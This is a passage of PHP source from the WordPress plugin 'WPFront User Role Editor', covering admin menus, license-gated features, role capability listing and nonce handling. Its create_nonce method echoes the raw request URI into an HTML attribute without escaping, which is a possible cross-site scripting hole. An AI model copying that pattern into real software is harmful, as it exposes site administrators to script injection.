        protected $admin_menu = array();
        protected $options;
        protected $objList;
        protected $objAddEdit;
        protected $objRestore;
        protected $objAddRemoveCap;
        protected $objAssignUsers;
        protected $objGoPro;
        protected $objNavMenu = NULL;
        protected $objLoginRedirect = NULL;

        function __construct() {
            parent::__construct(__FILE__, self::PLUGIN_SLUG);

            //$this->add_menu($this->__('WPFront User Role Editor'), $this->__('User Role Editor'));

            $this->options = new WPFront_User_Role_Editor_Options($this);
            $this->objGoPro = new WPFront_User_Role_Editor_Go_Pro($this);

            if ($this->objGoPro->has_license()) {
                $this->objList = new WPFront_User_Role_Editor_List($this);
                $this->objAddEdit = new WPFront_User_Role_Editor_Add_Edit($this);
                $this->objRestore = new WPFront_User_Role_Editor_Restore($this);
                $this->objAddRemoveCap = new WPFront_User_Role_Editor_Add_Remove_Capability($this);
                $this->objAssignUsers = new WPFront_User_Role_Editor_Assign_Roles($this);
                if ($this->objNavMenu === NULL)
                    $this->objNavMenu = new WPFront_User_Role_Editor_Nav_Menu($this);
                if ($this->objLoginRedirect === NULL)
                    $this->objLoginRedirect = new WPFront_User_Role_Editor_Login_Redirect($this);
            }
        }

        public function plugins_loaded() {
            //gravity forms
            if (!function_exists('members_get_capabilities')) {

                function members_get_capabilities() {
                    
                }

            }
        }

        public function admin_init() {
            register_setting(self::OPTIONS_GROUP_NAME, self::OPTION_NAME);

            $this->rename_role_capabilities();
        }

        protected function add_submenu_page($position, $title, $name, $capability, $slug, $func, $scripts = NULL, $styles = NULL, $controller = NULL) {
            if ($scripts === NULL)
                $scripts = 'enqueue_role_scripts';
            if ($styles === NULL)
                $styles = 'enqueue_role_styles';

            $this->admin_menu[$position] = array($title, $name, $capability, $slug, $func, $scripts, $styles, $controller);
        }

        protected function add_pro_page() {
            if (isset($this->admin_menu[1000]))
                return;

            if (current_user_can('manage_options'))
                $this->add_submenu_page(1000, $this->__('Go Pro'), '<span class="wpfront-go-pro">' . $this->__('Go Pro') . '</span>', 'manage_options', WPFront_User_Role_Editor_Go_Pro::MENU_SLUG, array($this->objGoPro, 'go_pro'));
        }

        public function admin_menu() {
            //parent::admin_menu();

            $this->add_pro_page();

            if ($this->objGoPro->has_license())
                $menu_slug = WPFront_User_Role_Editor_List::MENU_SLUG;
            else
                $menu_slug = WPFront_User_Role_Editor_Go_Pro::MENU_SLUG;

            if ($this->objGoPro->has_license()) {
                $this->add_submenu_page(10, $this->__('Roles'), $this->__('All Roles'), $this->get_capability_string('list'), WPFront_User_Role_Editor_List::MENU_SLUG, array($this->objList, 'list_roles'), NULL, NULL, $this->objList);
                $this->add_submenu_page(20, $this->__('Add New Role'), $this->__('Add New'), $this->get_capability_string('create'), WPFront_User_Role_Editor_Add_Edit::MENU_SLUG, array($this->objAddEdit, 'add_edit_role'), NULL, NULL, $this->objAddEdit);
                $this->add_submenu_page(30, $this->__('Restore Role'), $this->__('Restore'), $this->get_capability_string('edit'), WPFront_User_Role_Editor_Restore::MENU_SLUG, array($this->objRestore, 'restore_role'), NULL, NULL, $this->objRestore);
                $this->add_submenu_page(35, $this->__('Add/Remove Capability'), $this->__('Add/Remove Cap'), $this->get_capability_string('edit'), WPFront_User_Role_Editor_Add_Remove_Capability::MENU_SLUG, array($this->objAddRemoveCap, 'add_remove_capability'), NULL, NULL, $this->objAddRemoveCap);
                $this->add_submenu_page(37, $this->__('Login Redirect'), $this->__('Login Redirect'), 'edit_login_redirects', WPFront_User_Role_Editor_Login_Redirect::MENU_SLUG, array($this->objLoginRedirect, 'login_redirect'), NULL, NULL, $this->objLoginRedirect);
                $this->add_submenu_page(100, $this->__('Settings'), $this->__('Settings'), 'manage_options', WPFront_User_Role_Editor_Options::MENU_SLUG, array($this->options, 'settings'), NULL, NULL, $this->options);
            }

            ksort($this->admin_menu);

            if (!empty($this->admin_menu)) {
                $menu_capability = reset($this->admin_menu);
                $menu_capability = $menu_capability[2];
                add_menu_page($this->__('Roles'), $this->__('Roles'), $menu_capability, $menu_slug, null, $this->pluginURL() . 'images/roles_menu.png', '69.999999');
            }

            foreach ($this->admin_menu as $key => $value) {
                $page_hook_suffix = add_submenu_page($menu_slug, $value[0], $value[1], $value[2], $value[3], $value[4]);
                add_action('admin_print_scripts-' . $page_hook_suffix, array($this, $value[5]));
                add_action('admin_print_styles-' . $page_hook_suffix, array($this, $value[6]));
                if ($value[7] !== NULL)
                    $value[7]->set_page_hook($page_hook_suffix);
            }

            if ($this->objGoPro->has_license()) {
                $page_hook_suffix = add_users_page($this->__('Assign Roles | Migrate Users'), $this->__('Assign / Migrate'), 'promote_users', WPFront_User_Role_Editor_Assign_Roles::MENU_SLUG, array($this->objAssignUsers, 'assign_roles'));
                $this->objAssignUsers->set_page_hook($page_hook_suffix);
                add_action('admin_print_scripts-' . $page_hook_suffix, array($this, 'enqueue_role_scripts'));
                add_action('admin_print_styles-' . $page_hook_suffix, array($this, 'enqueue_role_styles'));
            }
        }

        //add scripts
        public function enqueue_role_scripts() {
//            $jsRoot = $this->pluginURLRoot . 'js/';

            wp_enqueue_script('jquery');
            wp_enqueue_script('postbox');
            wp_enqueue_script('jquery-ui-draggable');
        }

        //add styles
        public function enqueue_role_styles() {
            wp_enqueue_style('font-awesome-410', '//maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css', array(), '4.1.0');
            $styleRoot = $this->pluginURLRoot . 'css/';
            wp_enqueue_style('wpfront-user-role-editor-styles', $styleRoot . 'style.css', array(), self::VERSION);
        }

        //options page scripts
        public function enqueue_options_scripts() {
            $this->enqueue_role_scripts();
        }

        //options page styles
        public function enqueue_options_styles() {
            $this->enqueue_role_styles();

            $styleRoot = $this->pluginURLRoot . 'css/';
            wp_enqueue_style('wpfront-user-role-editor-options', $styleRoot . 'options.css', array(), self::VERSION);
        }

        public function get_capability_string($capability) {
            if ($this->enable_role_capabilities())
                return $capability . '_roles';

            return $capability . '_users';
        }

        public function permission_denied() {
            wp_die($this->__('You do not have sufficient permissions to access this page.'));
        }

        public function current_user_can($capability) {
            switch ($capability) {
                case 'list_roles':
                    return current_user_can($this->get_capability_string('list'));
                case 'edit_roles':
                    return current_user_can($this->get_capability_string('edit'));
                case 'delete_roles':
                    return current_user_can($this->get_capability_string('delete'));
                case 'create_roles':
                    return current_user_can($this->get_capability_string('create'));
                default :
                    return current_user_can($capability);
            }
        }

        public function create_nonce($id = '') {
            if (empty($_SERVER['REQUEST_URI'])) {
                $this->permission_denied();
                exit;
                return;
            }
            $referer = $_SERVER['REQUEST_URI'];
            echo '<input type = "hidden" name = "_wpnonce' . $id . '" value = "' . wp_create_nonce($referer . $id) . '" />';
            echo '<input type = "hidden" name = "_wp_http_referer' . $id . '" value = "' . $referer . '" />';
        }

        public function verify_nonce($id = '') {
            if (strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
                $flag = TRUE;
                if (empty($_POST['_wpnonce' . $id])) {
                    $flag = FALSE;
                } else if (empty($_POST['_wp_http_referer' . $id])) {
                    $flag = FALSE;
                } else if (!wp_verify_nonce($_POST['_wpnonce' . $id], $_POST['_wp_http_referer' . $id] . $id)) {
                    $flag = FALSE;
                }

                if (!$flag) {
                    $this->permission_denied();
                    exit;
                }
            }
        }

        public function footer() {
            return;
            ?>
            <div class="footer">
                <a target="_blank" href="http://wpfront.com/contact/"><?php echo $this->__('Feedback'); ?></a> 
                |
                <a target="_blank" href="http://wpfront.com/donate/"><?php echo $this->__('Buy me a Beer'); ?></a> 
            </div>
            <?php
        }

        public function options_page_header($title, $optionsGroupName = self::OPTIONS_GROUP_NAME) {
            parent::options_page_header($title, $optionsGroupName);
        }

        public function options_page_footer($settingsLink, $FAQLink, $extraLinks = NULL) {
            parent::options_page_footer($settingsLink, $FAQLink, $extraLinks);
        }

        public function get_capabilities($exclude_custom_post_types = FALSE) {
            if (self::$CAPABILITIES != NULL)
                return self::$CAPABILITIES;

            self::$CAPABILITIES = array();

            foreach (self::$STANDARD_CAPABILITIES as $key => $value) {
                self::$CAPABILITIES[$key] = array();
                foreach ($value as $cap => $roles) {
                    self::$CAPABILITIES[$key][] = $cap;
                }
            }

            foreach (self::$DEPRECATED_CAPABILITIES as $key => $value) {
                self::$CAPABILITIES[$key] = array();
                foreach ($value as $cap => $roles) {
                    self::$CAPABILITIES[$key][] = $cap;
                }
            }

            reset(self::$OTHER_CAPABILITIES);
            $other_key = key(self::$OTHER_CAPABILITIES);

            if ($exclude_custom_post_types) {
                foreach (self::$DYNAMIC_CAPS as $cap) {
                    self::$ROLE_CAPS = array_diff(self::$ROLE_CAPS, array($cap));
                    self::$OTHER_CAPABILITIES[$other_key][] = $cap;
                }
            }

            if ($this->enable_role_capabilities())
                self::$CAPABILITIES['Roles (WPFront)'] = self::$ROLE_CAPS;

            //gravity forms
            self::$OTHER_CAPABILITIES[$other_key] = apply_filters('members_get_capabilities', self::$OTHER_CAPABILITIES[$other_key]);

            global $wp_roles;
            if (isset($wp_roles->roles) && is_array($wp_roles->roles)) {
                foreach ($wp_roles->roles as $key => $role) {
                    foreach ($role['capabilities'] as $cap => $value) {
                        $found = FALSE;
                        foreach (self::$CAPABILITIES as $g => $wcaps) {
                            if (in_array($cap, $wcaps)) {
                                $found = TRUE;
                                break;
                            }
                        }
                        if (!$found && !in_array($cap, self::$OTHER_CAPABILITIES[$other_key])) {
                            self::$OTHER_CAPABILITIES[$other_key][] = $cap;
                        }
                    }
                }
            }

            if (!$exclude_custom_post_types) {
                $post_types = get_post_types(array(
                    '_builtin' => FALSE
                ));

                $other_caps = self::$OTHER_CAPABILITIES[$other_key];
                unset(self::$OTHER_CAPABILITIES[$other_key]);

                foreach ($post_types as $key => $value) {
                    $post_type_object = get_post_type_object($key);
                    $caps = $post_type_object->cap;

                    if ($post_type_object->capability_type === 'post') {
                        if ($post_type_object->show_ui)
                            self::$CUSTOM_POST_TYPES_DEFAULTED[$this->get_custom_post_type_label($post_type_object)] = array();
                    } else {
                        $caps = (OBJECT) $this->remove_meta_capabilities((ARRAY) $caps, $other_caps);
                        $custom_caps = array();
                        foreach (self::$STANDARD_CAPABILITIES['Posts'] as $key => $value) {
                            if (isset($caps->$key)) {
                                $custom_caps[] = $caps->$key;
                                unset($caps->$key);
                            }
                        }
                        foreach ($caps as $key => $value) {
                            if (isset($caps->$key)) {
                                $custom_caps[] = $caps->$key;
                                unset($caps->$key);
                            }
                        }
                        self::$OTHER_CAPABILITIES[$this->get_custom_post_type_label($post_type_object)] = $custom_caps;
                    }
                }

                self::$OTHER_CAPABILITIES[$other_key] = $other_caps;
            }

            self::$OTHER_CAPABILITIES[$other_key] = array_unique(self::$OTHER_CAPABILITIES[$other_key]);

            foreach (self::$OTHER_CAPABILITIES as $key => $value) {
                if (count($value) === 0)
                    continue;

                //self::$CAPABILITIES[$key] = $value;
                self::$CAPABILITIES[$key] = self::$OTHER_CAPABILITIES[$key];

                if ($key != $other_key) {
                    foreach ($value as $cap) {
                        self::$OTHER_CAPABILITIES[$other_key] = array_values(array_diff(self::$OTHER_CAPABILITIES[$other_key], array($cap)));
                    }
                }
            }

            return self::$CAPABILITIES;
        }

        public function add_role_capability($cap) {
            self::$ROLE_CAPS[] = $cap;
            $this->add_dynamic_capability($cap);
        }

        public function add_dynamic_capability($cap) {
            self::$DYNAMIC_CAPS[$cap] = $cap;
        }

        private function get_custom_post_type_label($post_type_object) {
            return $post_type_object->labels->name . ' (' . $post_type_object->name . ')';
        }

        private function remove_meta_capabilities($caps, $other_caps) {
            foreach ($caps as $key => $value) {
                if ($key === 'read') {
                    unset($caps[$key]);
                    continue;
                }

                if (!in_array($value, $other_caps))
                    unset($caps[$key]);
            }

            if (array_key_exists('create_posts', $caps) && array_key_exists('edit_posts', $caps)) {
                if ($caps['create_posts'] === $caps['edit_posts'])
                    unset($caps['create_posts']);
            }

            return $caps;
        }

        public function reset_capabilities() {
            self::$CAPABILITIES = NULL;

            foreach (self::$OTHER_CAPABILITIES as $key => $value) {
                self::$OTHER_CAPABILITIES[$key] = array();
            }
        }

        public function display_deprecated() {
            return $this->options->display_deprecated();
        }

        public function enable_role_capabilities() {
            return TRUE;
        }

        public function remove_nonstandard_capabilities_restore() {
            return $this->options->remove_nonstandard_capabilities_restore();
        }

        public function override_edit_permissions() {
            return $this->options->override_edit_permissions();
        }

        public function disable_navigation_menu_permissions() {
            return $this->options->disable_navigation_menu_permissions();
        }

        public function customize_permission_custom_post_types() {
            return $this->options->customize_permission_custom_post_types();
        }

        public function enable_multisite_only_options($multisite) {
            return TRUE;
        }

        public function enable_pro_only_options() {
            return FALSE;
        }

        private function rename_role_capabilities() {
            global $wp_roles;

            //removed in v2.5 but in wrong place.
//            foreach ($wp_roles->role_objects as $key => $role) {
//                foreach (self::$ROLE_CAPS as $value) {
//                    if ($role->has_cap('wpfront_' . $value)) {
//                        $role->add_cap($value);
//                        $role->remove_cap('wpfront_' . $value);
//                    }
//                }
//            }

            $role_admin = $wp_roles->role_objects[self::ADMINISTRATOR_ROLE_KEY];
            foreach (self::$ROLE_CAPS as $value) {
                $role_admin->add_cap($value);
            }
        }

        public static function Instanciate($file) {
            if (defined('WPFRONT_USER_ROLE_EDITOR_PLUGIN_FILE'))
                return;

            $f = 'wpfront-user-role-editor.php';
            $current_folder = strtolower(basename(dirname($file)));

            $folder = 'wpfront-user-role-editor-business-pro';
            if ($current_folder === $folder) {
                define('WPFRONT_USER_ROLE_EDITOR_PLUGIN_FILE', $file);
                new WPFront_User_Role_Editor_Business_Pro_Base();
                return;
            }

            if (!function_exists('is_plugin_active'))
                include_once( ABSPATH . 'wp-admin/includes/plugin.php' );

            if (is_plugin_active($folder . '/' . $f))
                return;

            $folder = 'wpfront-user-role-editor-personal-pro';
            if ($current_folder === $folder) {
                define('WPFRONT_USER_ROLE_EDITOR_PLUGIN_FILE', $file);
                new WPFront_User_Role_Editor_Personal_Pro_Base();
                return;
            }

            if (is_plugin_active($folder . '/' . $f))
                return;

            define('WPFRONT_USER_ROLE_EDITOR_PLUGIN_FILE', $file);
            new WPFront_User_Role_Editor();
        }

    }

}

require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-controller-base.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-options.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-list.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-add-edit.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-delete.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-restore.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-add-remove-capability.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-assign-roles.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-go-pro.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-nav-menu.php");
require_once(plugin_dir_path(__FILE__) . "class-wpfront-user-role-editor-login-redirect.php");
require_once(plugin_dir_path(__FILE__) . "integration/plugins/class-wpfront-user-role-editor-plugin-integration.php");



if (file_exists(plugin_dir_path(__FILE__) . "personal-pro/class-wpfront-user-role-editor-personal-pro.php"))
    require_once(plugin_dir_path(__FILE__) . "personal-pro/class-wpfront-user-role-editor-personal-pro.php");

if (file_exists(plugin_dir_path(__FILE__) . "business-pro/class-wpfront-user-role-editor-business-pro.php"))
    require_once(plugin_dir_path(__FILE__) . "business-pro/class-wpfront-user-role-editor-business-pro.php");
